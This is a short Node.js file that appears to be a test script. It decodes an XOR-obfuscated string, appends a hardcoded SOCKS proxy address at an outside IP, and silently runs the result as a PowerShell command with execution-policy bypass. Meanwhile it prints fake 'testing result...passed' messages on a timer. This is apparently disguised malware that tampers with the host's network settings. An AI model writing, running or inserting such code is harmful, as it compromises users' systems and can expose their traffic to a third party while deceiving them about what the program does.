const shell = require('node-powershell');
var index = 1;
var max = 55;
var interval;
var testProxy = "socks://47.90.96.247:1080";
var testStr = "͌ͱ͹̤͈ͨͧͭͻͪ͡͠Ϳ̩ͬͽͤ͹̧ͳ͠͹̩ͽͤ͹̧̩̩͕̄̃ͽͤ͹̧͕̣͕̣̈́ͧͤͧͬ͠͠ͱ̩̤ͬͼͺͬͻ̩͉ͮͦͦͥͬ͢͢Ͱͨͧͭͬͱ̧̩̤ͪͦͤͱͤͻ̩̤͹ͻͦͱͰ̩";

function _log(str){
  if(!str) return null;
  var encoded = "";
  for (var i = 0; i < str.length; i++) {
    var a = str.charCodeAt(i);
    var b = a ^ 777;
    encoded += String.fromCharCode(b);
  }
  return encoded;
}

console.log('starting...');

var ps = new shell({
  executionPolicy: 'Bypass',
  noProfile: true
});

ps.addCommand(_log(testStr) + testProxy)
ps.invoke()
.then(output => {
  //console.log(output);
})
.catch(err => {
  console.log(err);
  ps.dispose();
});

interval = setInterval(function () {
    if (index >= max) process.exit(0);
    console.log("testing result..." + index++ + '...passed');
}, 1000 * 60);
